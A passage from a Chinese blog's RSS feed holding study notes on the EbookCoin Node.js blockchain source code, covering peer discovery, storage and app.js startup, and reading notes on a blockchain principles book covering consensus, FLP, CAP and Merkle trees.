模块中的功能，意在实现合法性检测。</p><pre><code>library.scheme.validate(query, {    type: &quot;object&quot;,    properties: {        ip_str: {            type: &quot;string&quot;,            minLength: 1        },        port: {            type: &quot;integer&quot;,            minimum: 0,            maximum: 65535        }    },    required: [&apos;ip_str&apos;, &apos;port&apos;]}, function (err) {</code></pre><p>  可以看到，<strong>validate</strong> 的字面意思就是证实的意思。所以这样，可以用此，保证查询地址的合法性。</p><p>  之后通过 <code>privated.getByFilter({</code> 查询路由表，这里涉及到 dblite，使用的是SQLite 数据库</p></li></ul><h4 id="节点存储"><a href="#节点存储" class="headerlink" title="节点存储"></a>节点存储</h4><pre><code>在上面的部分实现了，对于单个节点的查询功能，使得可以返回路由信息等。这在这里就会有，关于节点信息的存储。</code></pre><hr><ul><li><p><strong>节点初始化</strong></p><p>  由于P2P,没有中心服务器，所以各个节点之间，只能靠自己的网络发现，来寻找彼此，所以，使用互联网节点进行初始化，是很重要的事情。可以很大的提高组网速度。</p><p>  在Config.js 文件中，也提供了初始化的节点列表</p><pre><code>&quot;peers&quot;: {    &quot;list&quot;: [        {            ip:0.0.0.0            port:7000        }    ],    &quot;blackList&quot;: [],    &quot;options&quot;: {        &quot;timeout&quot;: 4000    }},</code></pre></li></ul><hr><ul><li><p><strong>347 写入节点</strong></p><p>  根据函数的命名。可以看出这个是一个服务函数。是在区块链准备完成之后进行的。</p><blockquote><p><strong><span class="exturl" data-url="aHR0cDovL2Jsb2cuMTYzLmNvbS92aW5jZW50X3cvYmxvZy9zdGF0aWMvMjQ3Njk3MDUxMjAxNjkyNjc1NjMyODUzLw==" title="http://blog.163.com/vincent_w/blog/static/247697051201692675632853/">async简介<i class="fa fa-external-link"></i></span></strong></p></blockquote><pre><code>Peer.prototype.onBlockchainReady = function () {async.eachSeries(library.config.peers.list, function (peer, cb) {    library.dbLite.query(&quot;INSERT OR IGNORE INTO peers(ip, port, state, sharePort) VALUES($ip, $port, $state, $sharePort)&quot;, {        ip: ip.toLong(peer.ip),        port: peer.port,        state: 2,        sharePort: Number(true)    }, cb);}, function (err) {</code></pre><p>  这里是对列表中的每个项目，进行顺序执行。执行数据库查询语句，把已知的数据插入到数据库中</p><pre><code>INSERT OR IGNORE INTO peers(ip, port, state, sharePort) VALUES($ip, $port, $state, $sharePort)</code></pre><p>  这里就是插入语句，IGNORE 如果主键重复，就对其进行忽略，对于相同的列名进行插入。后面的指定是 插入内容的合法格式。这里的 <strong>state:2</strong> 是默认值，说明是<strong>正常节点</strong>。</p></li></ul><pre><code>**364** 这里是使用的 bus 辅助模块，相当于模块之间的通信总线，当节点准备完毕之后，发送 **peerReady** 消息。触发了 **peerReady事件**。    library.bus.message(&apos;peerReady&apos;);</code></pre><hr><ul><li><p><strong>374 节点更新</strong></p><p>  这部分实现的节点数据的更新。</p><pre><code>Peer.prototype.onPeerReady = function () {    setImmediate(function nextUpdatePeerList() {    // 这里是定时执行的函数，前面见过        privated.updatePeerList(function (err) {            err &amp;&amp; library.logger.error(&apos;updatePeerList timer&apos;, err);            setTimeout(nextUpdatePeerList, 60 * 1000);        })    });    setImmediate(function nextBanManager() {        privated.banManager(function (err) {            err &amp;&amp; library.logger.error(&apos;banManager timer&apos;, err);            setTimeout(nextBanManager, 65 * 1000)        });    });};</code></pre><p>  <code>setImmediate()</code> 立即执行预定的Callback.在I/O 实践回调之后立即触发。这里有领个，我们可以得知，第一个是循环(60s)更新节点列表，第二个是更新节点状态。</p><p>  <strong>52</strong> 这里是上面定时执行的节点更新函数。</p><pre><code>privated.updatePeerList = function (cb) {    modules.transport.getFromRandomPeer({        api: &apos;/list&apos;,        method: &apos;GET&apos;    }, function (err, data) {</code></pre><p>  这里是对<code>modules.transport.getFromRandomPeer()</code>的一次封装。翻译过来就是随机节点获取。<strong>474</strong></p><p>  这里是随机节点传输的实现函数：</p></li></ul><pre><code>    Transport.prototype.getFromRandomPeer = function (config, options, cb) {        if (typeof options == &apos;function&apos;) {            cb = options;            options = config;            config = {};        }        config.limit = 1;        async.retry(20, function (cb) {            modules.peer.list(config, function (err, peers) {    // 这里的函数就是list的callback                if (!err &amp;&amp; peers.length) {                    var peer = peers[0];                    self.getFromPeer(peer, options, cb);    // 这里使用自身函数实现对其他节点的 Get请求                } else {                    return cb(err || &quot;No peers in db&quot;);                }            });        }, function (err, results) {            cb(err, results);        });    };这里的 `async.retry` 是指对后面的函数重复 20 次。这里重复的 List 方法在Peer的定义里如下    **232**    Peer.prototype.list = function (options, cb) {        options.limit = options.limit || 100;        library.dbLite.query(&quot;select p.ip, p.port, p.state, p.os, p.sharePort, p.version from peers p &quot; + (options.dappid ? &quot; inner join peers_dapp pd on p.id = pd.peerId and pd.dappid = $dappid &quot; : &quot;&quot;) + &quot; where p.state &gt; 0 and p.sharePort = 1 ORDER BY RANDOM() LIMIT $limit&quot;, options, {            &quot;ip&quot;: String,            &quot;port&quot;: Number,            &quot;state&quot;: Number,            &quot;os&quot;: String,            &quot;sharePort&quot;: Number,            &quot;version&quot;: String        }, function (err, rows) {            cb(err, rows);        });    };这里实现了，对已知节点的数据查询，而且最大的查询数量是100个，其查询结果传入回调函数 cb。在上面的list调用中，rows，作为实参传给了 peers。如果没错误，且节点内容合法，读取 `peer[0]` (即IP地址)，对其发送 **getFromPeer** 请求！获取其他API。**518** 重点函数 getFromPeer实现了对其他节点的请求。下面是对请求结构的构造。    var req = {        url: &apos;http://&apos; + ip.fromLong(peer.ip) + &apos;:&apos; + peer.port + url,        method: options.method,        json: true,        headers: _.extend({}, privated.headers, options.headers),        timeout: library.config.peers.options.timeout    };get函数会直接返回请求结果    return request(req, function (err, response, body) {    if (err || response.statusCode != 200) {    // 这里是对请求异常，分无法连接，和返回错误两种        library.logger.debug(&apos;Request&apos;, {            url: req.url,            statusCode: response ? response.statusCode : &apos;unknown&apos;,            err: err        });        if (peer) {            if (err &amp;&amp; (err.code == &quot;ETIMEDOUT&quot; || err.code == &quot;ESOCKETTIMEDOUT&quot; || err.code == &quot;ECONNREFUSED&quot;)) {                // 这里对于，异常节点，故障。进行删除                modules.peer.remove(peer.ip, peer.port, function (err) {                    if (!err) {                        library.logger.info(&apos;Removing peer &apos; + req.method + &apos; &apos; + req.url)                    }                });            } else {                // 这里是返回值异常的节点，对其状态更改ban掉                if (!options.not_ban) {                        modules.peer.state(peer.ip, peer.port, 0, 600, function (err) {                        if (!err) {                            library.logger.info(&apos;Ban 10 min &apos; + req.method + &apos; &apos; + req.url);                        }                    });                }            }        }        cb &amp;&amp; cb(err || (&apos;request status code&apos; + response.statusCode));        return;    }这里是**核心函数**的前面的错误处理的部分，主要分两种情况，对无法连接和返回值异常的节点进行处理。前者直接进行删除，后者先ban十分钟。---**564** 在这个部分，对于请求的返回信息，进行解析，一样的使用的是`scheme.validate()`方法，其判断其格式是否如给定一样，如果解析失败，那么返回空数据。    var report = library.scheme.validate(response.headers, {        type: &quot;object&quot;,        properties: {            os: {                type: &quot;string&quot;,                maxLength: 64            },            port: {                type: &quot;integer&quot;,                minimum: 1,                maximum: 65535            },            &apos;share-port&apos;: {                type: &quot;integer&quot;,                minimum: 0,                maximum: 1            },            version: {                type: &quot;string&quot;,                maxLength: 11            }        },        required: [&apos;port&apos;, &apos;share-port&apos;, &apos;version&apos;]    });    if (!report) {        return cb &amp;&amp; cb(null, {body: body, peer: peer});    }**593** 这里剩下的就是正常的，可以被解析的数据了。先对其端口合法化进行检测，之后对比自身版本号是否相同，一切一切都OK了，那么我们就使用update进行更新        var port = response.headers.port;        if (port &gt; 0 &amp;&amp; port &lt;= 65535 &amp;&amp; response.headers[&apos;version&apos;] == library.config.version) {            modules.peer.update({                ip: peer.ip,                port: port,                state: 2,                os: response.headers[&apos;os&apos;],                sharePort: Number(!!response.headers[&apos;share-port&apos;]),                version: response.headers[&apos;version&apos;]            });        }        cb &amp;&amp; cb(null, {body: body, peer: peer});至此，节点列表更新循环完毕。**382** 节点状态刷新循环。这个循环时循环的 BanManager    rivated.banManager = function (cb) {        library.dbLite.query(&quot;UPDATE peers SET state = 1, clock = null where (state = 0 and clock - $now &lt; 0)&quot;, {now: Date.now()}, cb);    };这里就比较简单，对于超时的节点，对其状态进行刷新。</code></pre><hr><p>至此，一个P2P的网络构建完成。</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>虽说，通过这部分的源码理解，和对其源码设计的思考。基本上是了解了，一个基于http的P2P网络的构成。总结讲，就是对节点其他节点的列表请求来拓展自己目前的节点列表，从而一步步的构成一个P2P网络。</p><p>不过，实际上，还是有很多值得思考，和未知的地方，</p><ol><li>网络发现，因为我们不可能一开始就有多数的节点，所以网络发现感觉挺重要</li><li>关于节点间通信，如果作为对等节点，基本的功能可以通过 api 实现，不过如果我是想，进行一个 点对点的通信，而不是广播请求。那么又将如何实现？</li></ol>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/05/03/BC_EbookCoin_0x2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>EbookCoin 源码 0x1</title>
      <link>https://www.diglp.xyz/2018/05/02/BC_EbookCoin_0x1/</link>
      <guid>https://www.diglp.xyz/2018/05/02/BC_EbookCoin_0x1/</guid>
      <pubDate>Tue, 01 May 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这次的一个period是基于《Nodejs区块链开发》这本书的的区块链项目–亿书，的源码学习笔记</p><blockquote><p>EbookCoin<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Vib29rY29pbi9lYm9va2NvaW4uZ2l0" title="https://github.com/Ebookcoin/ebookcoin.git">项目地址<i class="fa fa-external-link"></i></span></p><h2 id="app-js"><a href="#app-js" class="headerlink" title="app.js"></a>app.js</h2></blockquote><p>这个 <strong>app.js</strong> 是在node.js 中的入口程序文件，在其他情况下也可能是 <strong>server.js</strong> 。类似以python的顺序执行的模式。没有(可以用)一个main。</p><h3 id="模块依赖"><a href="#模块依赖" class="headerlink" title="模块依赖"></a>模块依赖</h3><p>下面的代码是 <strong>app.js 1~15</strong> 主要的是导入的模块。这里，一个个的search这些模块的功能</p><pre><code>var program = require(&apos;commander&apos;);                // 命令行框架开源包 commander.jsvar packageJson = require(&apos;./package.json&apos;);    // 定义了这个项目所需要的各种模块var Logger = require(&apos;./logger.js&apos;);            // 日志模块var appConfig = require(&quot;./config.json&quot;);        // 全局默认配置var genesisblock = require(&apos;./genesisBlock.json&apos;);    // 创世区块的设置var async = require(&apos;async&apos;);                    //    异步编程包var extend = require(&apos;extend&apos;);                    // 实现Obj的重载var path = require(&apos;path&apos;);                        // 处理路径的包var https = require(&apos;https&apos;);                    // TLS/SSL的包var fs = require(&apos;fs&apos;);                            // 文件系统包var z_schema = require(&apos;z-schema&apos;);                // 同步异步？var util = require(&apos;util&apos;);                        // 模块支持包var Sequence = require(&apos;./helpers/sequence.js&apos;);    // </code></pre><ul><li><p><strong>config.json</strong></p><p>  在导入文件中，<code>config.json</code> 是全局配置文件。当参数少的时候，可以硬编码到代码里，当参数多的时候就是需要 全局配置文件。</p><pre><code>{    &quot;port&quot;: 7000,    &quot;address&quot;: &quot;0.0.0.0&quot;,    &quot;serveHttpAPI&quot;: true,    &quot;serveHttpWallet&quot;: true,    &quot;version&quot;: &quot;0.1.3&quot;,    ...</code></pre></li><li><p><strong>commander.js</strong></p><pre><code>program    .version(packageJson.version)    .option(&apos;-c, --config &lt;path&gt;&apos;, &apos;Config file path&apos;)    .option(&apos;-p, --port &lt;port&gt;&apos;, &apos;Listening port number&apos;)    .option(&apos;-a, --address &lt;ip&gt;&apos;, &apos;Listening host name or ip&apos;)    .option(&apos;-b, --blockchain &lt;path&gt;&apos;, &apos;Blockchain db path&apos;)    .option(&apos;-x, --peers [peers...]&apos;, &apos;Peers list&apos;)    .option(&apos;-l, --log &lt;level&gt;&apos;, &apos;Log level&apos;)    .parse(process.argv);    // 参数在这里</code></pre><p>  这里是使用 commander 模块对输入的启动参数(process.argv)进行解析。</p><pre><code>$ node app.js -p 8080 # 这里是启动进程的参数# 这样的话参数就被按序的保存在了program里program.port == &apos;8080&apos; // True</code></pre></li></ul><h3 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h3><ul><li><p><strong>20~70</strong> 实现了一个对于启动参数的解析和保存功能。</p></li><li><p><strong>35</strong> 周期性的调用，<code>setInterval</code> 可以对设置的函数进行周期性调用。</p><pre><code>if (typeof gc !== &apos;undefined&apos;) {    setInterval(function () {        gc();    }, 60000);    // 1 min}</code></pre></li><li><p><strong>72</strong> <strong>103</strong> 异常处理</p><p>  这里是对于这个app的异常处理的函数，一样的是回调。报一个 fatal 并且发送消息</p><pre><code>process.on(&apos;uncaughtException&apos;, function (err) {    // handle the error safely    logger.fatal(&apos;System error&apos;, { message: err.message, stack: err.stack });    process.emit(&apos;cleanup&apos;);    // 发送信号给handler});</code></pre><p>  这里，应该应该也是个异常处理，应该是同时会log异常产生的域</p><pre><code>var d = require(&apos;domain&apos;).create();d.on(&apos;error&apos;, function (err) {    logger.fatal(&apos;Domain master&apos;, { message: err.message, stack: err.stack });    process.exit(0);});</code></pre></li><li><p><strong>101</strong> logger的初始化</p></li><li><p><strong>78</strong> 缺省的硬编码配置，应该挺重要所以贴出</p><pre><code>var config = {    &quot;db&quot;: program.blockchain || &quot;./blockchain.db&quot;,    &quot;modules&quot;: {        &quot;server&quot;: &quot;./modules/server.js&quot;,        &quot;accounts&quot;: &quot;./modules/accounts.js&quot;,        &quot;transactions&quot;: &quot;./modules/transactions.js&quot;,        &quot;blocks&quot;: &quot;./modules/blocks.js&quot;,        &quot;signatures&quot;: &quot;./modules/signatures.js&quot;,        &quot;transport&quot;: &quot;./modules/transport.js&quot;,        &quot;loader&quot;: &quot;./modules/loader.js&quot;,        &quot;system&quot;: &quot;./modules/system.js&quot;,        &quot;peer&quot;: &quot;./modules/peer.js&quot;,        &quot;delegates&quot;: &quot;./modules/delegates.js&quot;,        &quot;round&quot;: &quot;./modules/round.js&quot;,        &quot;contacts&quot;: &quot;./modules/contacts.js&quot;,        &quot;multisignatures&quot;: &quot;./modules/multisignatures.js&quot;,        &quot;dapps&quot;: &quot;./modules/dapps.js&quot;,        &quot;sia&quot;: &quot;./modules/sia.js&quot;,        &quot;crypto&quot;: &quot;./modules/crypto.js&quot;,        &quot;sql&quot;: &quot;./modules/sql.js&quot;    }};</code></pre><p>  这里基本上是描述了功能所对应的模块</p></li><li><p><strong>108</strong> 这里的一个 <code>d.run()</code> 可能是打开了大门</p><p>  前面得知，d是我们创建的一个域，这里应该就是我们的域开始的时候了。这部分书中称为是模块加载。<br>   这里有个十分重要的东西 <code>async</code>。</p><blockquote><p>Async is a utility module which provides straight-forward, powerful functions for working with asynchronous JavaScript. </p></blockquote><p>  官方的描述，是该模块提供了一个处理异步的功能。这里的<code>async.auto</code>意味着代码的顺序执行.</p><pre><code>function auto&lt;R extends async.Dictionary&lt;any&gt;, E&gt;(tasks: async.AsyncAutoTasks&lt;R, E&gt;, concurrency?: number, callback?: async.AsyncResultCallback&lt;R, E&gt;): void</code></pre><p>  这个是auto函数的定义,可以看见, 在后面的如同 <code>logger: function (cb) {</code><br>  这种形式的,实际上 <strong>logger</strong> 就是成为了一个任务task(这里本来就是要发生调度的)。那么这里就相当于定义了一组task。</p></li><li><p><strong>222</strong> 网络的初始化</p><p>  在书中，是直接跳过了前面的调度说明(虽说有点理解)，直接到了网络这个任务。</p><p>  下面是网络加载的部分代码：</p><pre><code>var express = require(&apos;express&apos;);var app = express();var server = require(&apos;http&apos;).createServer(app);var io = require(&apos;socket.io&apos;)(server);</code></pre><p>  这里使用了 <strong><span class="exturl" data-url="aHR0cDovL3d3dy5leHByZXNzanMuY29tLmNuLw==" title="http://www.expressjs.com.cn/">express<i class="fa fa-external-link"></i></span></strong> 模块，这个是一个web 应用的开发框架.上面这段代码,算是对于网络服务的初始化,框架绑定 <strong>服务(HTTP)</strong>,服务绑定 <strong>io(SOCKET)</strong>.</p><p>  这里的Scope到底是怎么来的???可能是对这个执行原理是不清楚.不过书中是直接让理解成为从 <strong><code>config.js</code></strong> 的内容包含(即前面的所有模块).</p><ul><li><p><strong>228</strong> 这里是对是否使用 SSL 的一个判断</p><pre><code>if (scope.config.ssl.enabled) {</code></pre><p>  可以在 Config.json 里找到对应的配置</p><pre><code>&quot;ssl&quot;: {    &quot;enabled&quot;: false,    &quot;options&quot;: {        &quot;port&quot;: 443,        &quot;address&quot;: &quot;0.0.0.0&quot;,        &quot;key&quot;: &quot;./ssl/ebookcoin.key&quot;,        &quot;cert&quot;: &quot;./ssl/ebookcoin.crt&quot;    }</code></pre></li></ul></li><li><p><strong>277</strong> 构建链接 实际上是网络模块直接的链接</p><p>  这里可以看到使用的模块,就会很多了.所以这里是实现模块间的功能链接</p><pre><code>connect: [&apos;config&apos;, &apos;public&apos;, &apos;genesisblock&apos;, &apos;logger&apos;, &apos;build&apos;, &apos;network&apos;, function (cb, scope) {</code></pre><p>  这部分,是真的有点模糊,什么中间价之类的…实际上这里的app是我们的express的框架,那么这里的use,理应是对框架所使用的功能的配置.</p><ul><li><p><strong>310</strong> 这里可能是对我们的http请求的解析</p><pre><code>var parts = req.url.split(&apos;/&apos;);</code></pre><p>  这里分割 url ,把请求分词存在<code>part</code>里面.这里是解析的函数.</p><pre><code>if (parts.length &gt; 1) {    if (parts[1] == &apos;api&apos;) {        if (scope.config.api.access.whiteList.length &gt; 0) {            if (scope.config.api.access.whiteList.indexOf(ip) &lt; 0) {                    res.sendStatus(403);                } else {                    next();                }            } else {                next();            }        } else if (parts[1] == &apos;peer&apos;) {            if (scope.config.peers.blackList.length &gt; 0) {                if (scope.config.peers.blackList.indexOf(ip) &gt;= 0) {                    res.sendStatus(403);                } else {                    next();                }            } else {                next();            }        } else {            next();        }    } else {        next();    }});</code></pre></li><li><p><strong>343</strong> 开始服务监听</p><p>  这个 Listen 我当然懂..终于由开的明白的了,在指定地址,和端口进行监听</p><pre><code>scope.network.server.listen(scope.config.port, scope.config.address, function (err) {</code></pre><blockquote><p>“Ebookcoin started”</p></blockquote></li></ul></li></ul><ul><li><strong>386</strong> 逻辑加载 ,可能是针对模块间的逻辑,进行的 New.</li><li><strong>418</strong> 模块加载, 卒</li></ul><h3 id="Todo"><a href="#Todo" class="headerlink" title="Todo"></a>Todo</h3><h2 id="文件总结"><a href="#文件总结" class="headerlink" title="文件总结"></a>文件总结</h2><p>app.js 是第一个启动文件, 也是最重要的一个,这里实现了模块的加载,功能的初始化,最重要的是实现了全部的 任务的调度, 由于对于async的不熟悉,和网络框架的不了解,对全局上的实现,还是理解较弱,不过,随着后面的学习,理解程度肯定会加深,来补充 TODO</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/05/02/BC_EbookCoin_0x1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书 《区块链原理设计及应用》</title>
      <link>https://www.diglp.xyz/2018/05/01/BC_Book_%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/</link>
      <guid>https://www.diglp.xyz/2018/05/01/BC_Book_%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/</guid>
      <pubDate>Mon, 30 Apr 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;可能自己渴望一个更高知的环境&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><blockquote><p>可能自己渴望一个更高知的环境</p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：区块链原理设计及应用</li><li>作者：杨保华 陈昌</li><li>ISBN：9787111577829</li></ul><blockquote><p>区块链和机器学习被誉为未来十年最有可能提供人类社会生产力两大创新科技。</p></blockquote><h2 id="区块链杂谈"><a href="#区块链杂谈" class="headerlink" title="区块链杂谈"></a>区块链杂谈</h2><p>在比特币项目的发展过程中，借鉴了来自 数字货币，密码学，博弈论，分布式系统，控制论等多个领域的成果。<br>比特币系统<strong>首次真正的从实践意义上实现了安全可靠的去中心化数字货币机制</strong></p><p>BitCoin 解决了现有的数组货币的以下问题 </p><ul><li>被掌握在单一的机构中容易被攻击</li><li>自身的价值无法保证，容易出现波动</li><li>无法匿名交易，不够匿名</li></ul><blockquote><p>运用之心夺造化，存乎一心胜天工。</p></blockquote><p>区块链系统和普通的分布式系统不同，其处理性能很难通过单纯的增加节点数进行横向的扩展。实际上，传统区块链的系统的性能，在很大的程度上取决于单个节点的处理能力。<strong>高性能，安全，稳定性，硬件辅助加解密能力</strong> 是考察节点性能的核心要素。</p><p>严格意义上讲，货币(money)不等于现金或者通货(cash/currency),货币的含义更加广泛。<strong>在比特币白皮书的原版中(Bitcoin: A Peer-to-Peer Electronic Cash System)使用的是cash！</strong></p><p>书中提出的一点设想，这里引用之:</p><blockquote><p>大胆的预测，未来可能出现更具针对性的”BlockDB”,专门服务类类似的区块链这样的新型数据业务。最小的操作单位是一个块。</p></blockquote><p>未来的几年内，区块链的演化应用场景有如下:</p><ul><li>金融服务</li><li>征信和权属管理</li><li>资源共享</li><li>贸易管理</li><li>物联网 (未来几年再租赁，物流等场景可能会有大规模应用。<strong>但是目前阶段，物联网自身的技术局限短期内是不会有大规模应用</strong>)</li></ul><p>这里针对书中物联网，展开。</p><p>典型应用场景分析:给每个物联网设备分配一个地址，给该地址关联一个账户，用户通过账户支付，可以实现设备的租赁，达到一个承载价值的物联网。在此中，物联网的设备数量增多，边沿计算的增强，大量设备之间形成的分布式自组织的管理模式，而且具有很高的容错性。总结讲：区块链技术所具有的分布式和抗攻击的特点可以很好的融入</p><hr><p>不过国外实际上早有以个成熟的项目 Slock，其主要的模式，是iot设备抽象成了一个锁</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9zbG9jay5pdC8=" title="https://slock.it/">Slock Prj<i class="fa fa-external-link"></i></span></p></blockquote><p>这里我们设想，要是共享单车使用这种技术，那么架构，将会是巨大的改变。在2015 年 IBM已经与Samsung合作进行去中心化的P2P物联网技术。</p><p>在书中提到了<strong>IOT安全</strong> 这个Point 已经被提出了<strong>实在是遗憾</strong></p><blockquote><p><span class="exturl" data-url="aHR0cDovL3d3dy5uZXVyb21lc2guY28v" title="http://www.neuromesh.co/">NeuroMesh Prj<i class="fa fa-external-link"></i></span> 物联网疫苗</p></blockquote><p>包括公共网络服务，DNS。DNS是一直被诟病的系统，一个只有13个根节点，全球的域名托付于此，所以，这种共有的系统的去中心化是趋势和必然。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9lbWVyY29pbi5jb20vemg=" title="https://emercoin.com/zh">Emercoin Prj<i class="fa fa-external-link"></i></span> 崛起币</p></blockquote><h2 id="区链原理"><a href="#区链原理" class="headerlink" title="区链原理"></a>区链原理</h2><h3 id="区块链共识"><a href="#区块链共识" class="headerlink" title="区块链共识"></a>区块链共识</h3><ul><li>一致性</li></ul><p>区块链作为一个分布式系统，其首要问题是 <strong>一致性(Consistency)</strong> 。在区块链中，有多个服务节点，可以试图他们的处理结果达成某种共识。这种共识叫做<strong>区块链共识</strong>。</p><p>一致性并不代表着结果的正确与否，实际是是这个分布式系统对外呈现的结果的一致。</p><p>分布式系统最大的套装，就是在这个一致性，按照书中的例子，比如我们买火车票，全国的人们都可以去买一张票，然而售票处是全国都有的，所以如何保证，这个票最终只会被卖给一个正确的人。这个就是一个一致性的算法，实际是叫做 <strong>Paxos</strong> （这个在区块链核心算法中有讲到），这种思想，就是<strong>对可能引发不一致的并行操作进行串行化</strong>。</p><hr><ul><li>共识算法</li></ul><p>共识(Consensus)和一致性(Consistency)实际是不是一个东西，从文中的理解来说，共识是一个过程，一致是一个状态。所以，共识算法的存在，就是使得区块链整体趋于一致的东西。在我们熟悉的BTC中，用于实现的共识算法，很简单。<strong>谁最长且合法，谁就是对的</strong>，在这个过程中中本聪先生引入了 <strong>PoW</strong> 机制，使得加入了<strong>成本和概率</strong>，所以说区块链技术，是对很多学科的一种综合</p><p>这部分可以看详细文章:<span class="exturl" data-url="aHR0cDovL2Jsb2cuZGlnbHAueHl6LzIwMTgvMDMvMTQvQnl6YW50aXVtLw==" title="http://blog.diglp.xyz/2018/03/14/Byzantium/">拜占庭将军和共识算法<i class="fa fa-external-link"></i></span></p><hr><ul><li>FLP不可能原理:</li></ul><blockquote><p>即使在网络通信可靠的情况下，可拓展的分布式系统的公式问题，其通用解法的下限是–没有下限（无解）。</p><p>在网络可靠，但运行节点失败(即使只有一个)的最小化异步模型系统中，不存在一个可以解决一致性问题的确定性共识算法</p><p>(No completely asynchronous consensus can tolerate even a single unannounced process death)</p></blockquote><p>这个 <strong>FLP</strong> 可以称为分布式领域里的 <strong>“测不准原理”</strong> ， <strong>不要浪费时间，去为一部分布式系统设计在任意场景下都能实现共识的算法</strong></p><p>关于 FLP 算法，实际上是在图论中有了系统的证明，但是在文章也是举了一个通俗的例子:</p><p>比如，在一个投票里面，有ABC，三个投票者，他们可以在任何时候投票(异步)，他们之间可以通过电话通信(可靠网络)，只是他们可能有时候会睡着。所以这里就出现了一个情况，任何一个人都有睡着的可能，那么获取投票的结果需要三个人都完成投票，才能实现系统的共识,即完成此次投票，产生结果，所以当有一个人睡着后，这个共识系统的共识结果将永远的不会得知，直到那个人醒来。</p><p>通过这个例子实际上说明了:<strong>纯粹的异步系统无法保证一致性在有限的时间内完成</strong>。但是，这种一致性我，称之<strong>强一致性</strong>。</p><ul><li>CAP 原理</li></ul><p>在上面的FLP中，并不是说明共识是不可能实现了。实际上的应用远没有那么理论；<strong>这就是工程师和科学家</strong></p><p>文章中有一句话，很棒:</p><blockquote><p>科学家告诉你去赌博从概率上讲总是会输钱；工程师则告诉你，如果你愿意接受最终输钱的风险，中间说不定可以小赢几笔钱。</p></blockquote><p>CAP原理，实际上来自于三个单词: Consistency,Availability,Partition</p><blockquote><p>分布式计算系统，不可能同时确保以下三个特性: <strong>一致性(Consistency)，可用性(Availability)，分区容忍性(Partition)</strong>,设计中往往需要弱化某个特性的保证。</p></blockquote><ul><li>一致性:任何操作应该是原子的，发生在后面的时间能看到签名事件发生所导致的结果，（强一致性）。</li><li>可用性:在有限的时间内，任何非失败的节点都可以应答请求</li><li>分区容忍性:网络可能发生分区，即节点之间的通信不可保障。</li></ul><p>对于网络分区的理解:网络可能出现分区时，系统是无法保证一致性和可用性的。要么，节点收到请求后因为没有其他节点确认而不应答(牺牲可用性)，要么节点只能应答非一致性的结果(牺牲一致性)。个人理解为，网络被分区，或者说分片</p><hr><ul><li>ACID 原则</li></ul><p>原子性(Atomicity),一致性(Consistency)，隔离性(Isolation)，持久性(Durability)。</p><p>操作原子性，要么成功，要么不做。状态一直，无中间态，彼此的操作独立，改变持久，不会有时效性。</p><hr><p><strong>PAXOS算法！</strong> 后面深入学习。</p><h3 id="密码学基础"><a href="#密码学基础" class="headerlink" title="密码学基础"></a>密码学基础</h3><p>该部分有部分基础，简略带过，主要记录 Kayward</p><p><strong>Hash：正向快速，逆向困难，输入敏感，冲突避免</strong></p><p>对称加密：加解密速度快，前提是<strong>双方提前持有密钥</strong>。</p><p>非对称加密：不需要提前密钥（RSA）广泛用于非可信信道</p><p>混合加密：TLS 握手协商过程</p><p>消息认证码(对称)：<strong>HMAC(Hash-based Message Authentication Code)</strong> 验证消息完整性 integrity </p><p>数字签名(非对称)：盲签名，多重签名，群签名，环签名。验证消息完整性 integrity </p><p>PKI体系：PEM证书</p><hr><ul><li>默克尔树</li></ul><p>默克尔(Merkle)树，又名哈希树，是一种典型的二叉树结构，在区块链出现之前，是广泛的应用在文件系统和P2P系统中</p><p><img src="http://blog.diglp.xyz/images/BC_MK.jpeg" alt=""></p><p>这里是一篇默克尔树的简介</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuZGlnbHAueHl6LzIwMTgvMDIvMjgvTWVya2xlVHJlZV8xLw==" title="http://blog.diglp.xyz/2018/02/28/MerkleTree_1/">What is Merkle-Tree<i class="fa fa-external-link"></i></span></p></blockquote><p>在这个结构中，一个巧妙的应用是零知识证明，以图为例，在图中我们只需要提供 Habc，Hab，Hb，那么验证者，就可以进行Ha的合法性检验，<strong>而不需要知道Ha的具体内容</strong>。通俗讲，我不需要告诉你这个东西的具体细节，就可以证明这个东西的正确</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuZGlnbHAueHl6LzIwMTgvMDMvMTUvTWVya2xlVHJlZV8yLw==" title="http://blog.diglp.xyz/2018/03/15/MerkleTree_2/">零知识证明<i class="fa fa-external-link"></i></span></p></blockquote><hr><ul><li>布隆过滤器(Bloom 